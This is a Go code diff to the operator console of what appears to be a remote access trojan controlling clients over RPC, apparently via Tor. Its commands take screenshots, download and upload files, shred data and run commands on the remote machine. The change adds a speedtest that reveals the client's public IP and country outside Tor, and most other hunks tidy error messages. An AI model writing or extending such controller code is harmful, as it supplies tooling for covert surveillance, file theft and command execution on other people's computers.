@@ -80,6 +80,11 @@ func (client activeClient) shellClient() {
 			Help: "tell the client to reconnect",
 		},
 		{
+			Name: "speedtest",
+			Func: client.Speedtest,
+			Help: "run a speedtest on a clients native internet connection (non-tor)",
+		},
+		{
 			Name: "exit",
 			Func: func(c *ishell.Context) {
 				c.Stop()
@@ -102,8 +107,7 @@ func (client *activeClient) ls(c *ishell.Context) {
 	r := shared.Dir{}
 	err := client.RPC.Call("API.LS", void, &r)
 	if err != nil {
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list!"))
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
+		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Encoutered error during list:", err))
 		return
 	}
 	client.Dir = r
@@ -118,8 +122,7 @@ func (client *activeClient) Cat(c *ishell.Context) {
 	var r string
 	err := client.RPC.Call("API.Cat", path, &r)
 	if err != nil {
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file!"))
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
+		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not cat file:", err))
 	}
 	c.Println(r)
 }
@@ -130,8 +133,7 @@ func (client *activeClient) Cd(c *ishell.Context) {
 	r := shared.Dir{}
 	err := client.RPC.Call("API.Cd", path, &r)
 	if err != nil {
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path!"))
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
+		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Could not change to that path:", err))
 	}
 	client.Dir = r
 }
@@ -146,9 +148,8 @@ func (client *activeClient) Download(c *ishell.Context) {
 
 	err := client.RPC.Call("API.SendFile", arg, &r)
 	if err != nil {
-		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server!"))
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Download could not be sent to Server:", err))
 		c.ProgressBar().Stop()
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
 		return
 	}
 
@@ -156,16 +157,14 @@ func (client *activeClient) Download(c *ishell.Context) {
 	dlDir, _ := filepath.Split(dlPath)
 
 	if err := os.MkdirAll(dlDir, os.ModePerm); err != nil {
-		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path!"))
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Could not create directory path:", err))
 		c.ProgressBar().Stop()
-		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 
 	if err := ioutil.WriteFile(dlPath, r.Content, 0600); err != nil {
-		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path!"))
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Download failed to write to path:", err))
 		c.ProgressBar().Stop()
-		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 
@@ -183,9 +182,8 @@ func (client *activeClient) Upload(c *ishell.Context) {
 
 	content, err := ioutil.ReadFile(path)
 	if err != nil {
-		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file!"))
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed could not read local file:", err))
 		c.ProgressBar().Stop()
-		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 
@@ -196,9 +194,8 @@ func (client *activeClient) Upload(c *ishell.Context) {
 	}
 
 	if err := client.RPC.Call("API.RecvFile", f, &void); err != nil {
-		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed!"))
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Upload failed:", err))
 		c.ProgressBar().Stop()
-		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 
@@ -216,16 +213,15 @@ func (client *activeClient) Screen(c *ishell.Context) {
 	var r []byte
 
 	if err := client.RPC.Call("API.Screen", void, &r); err != nil {
-		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed!"))
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Screenshot failed:", err))
 		c.ProgressBar().Stop()
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
 		return
 	}
+
 	err := ioutil.WriteFile(filepath.Join(client.Client.Path, filename), r, 0600)
 	if err != nil {
-		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved"))
+		c.ProgressBar().Final(green("[Server] ") + red("[!] Screenshot could not be saved:", err))
 		c.ProgressBar().Stop()
-		c.Println(green("[Server] ") + red("[!] ", err))
 		return
 	}
 	c.ProgressBar().Final(green("[Server] ") + green("[+] Screenshot received"))
@@ -257,10 +253,25 @@ func (client *activeClient) Shred(c *ishell.Context) {
 	}
 }
 
-// ping something?
-// TODO: I don't think this feature works
-func (client *activeClient) Ping(c *ishell.Context) error {
-	return client.RPC.Call("API.Ping", void, &void)
+// Speedtest the clients internet connection
+func (client *activeClient) Speedtest(c *ishell.Context) {
+	c.ProgressBar().Indeterminate(true)
+	c.ProgressBar().Start()
+
+	r := shared.Speedtest{}
+	if err := client.RPC.Call("API.Speedtest", void, &r); err != nil {
+		c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + red("[!] Could not perform speedtest on client:", err))
+		return
+	}
+
+	c.ProgressBar().Final(yellow("["+client.Client.Name+"] ") + green("[+] Speedtest finished"))
+	c.ProgressBar().Stop()
+
+	c.Println(green("Public IP: "), r.IP)
+	c.Println(green("Country:   "), r.Country)
+	c.Println(green("Ping:      "), r.Ping)
+	c.Println(green("Download:  "), r.Download)
+	c.Println(green("Upload:    "), r.Upload)
 }
 
 // Run a command on client
@@ -272,10 +283,8 @@ func (client *activeClient) runCommand(c *ishell.Context) {
 		Powershell: false,
 	}
 
-	err := client.RPC.Call("API.RunCmd", args, &r)
-	if err != nil {
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Bad or unkown command!"))
-		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] ", err))
+	if err := client.RPC.Call("API.RunCmd", args, &r); err != nil {
+		c.Println(yellow("["+client.Client.Name+"] ") + red("[!] Bad or unkown command:", err))
 	}
 
 	c.Println(r)
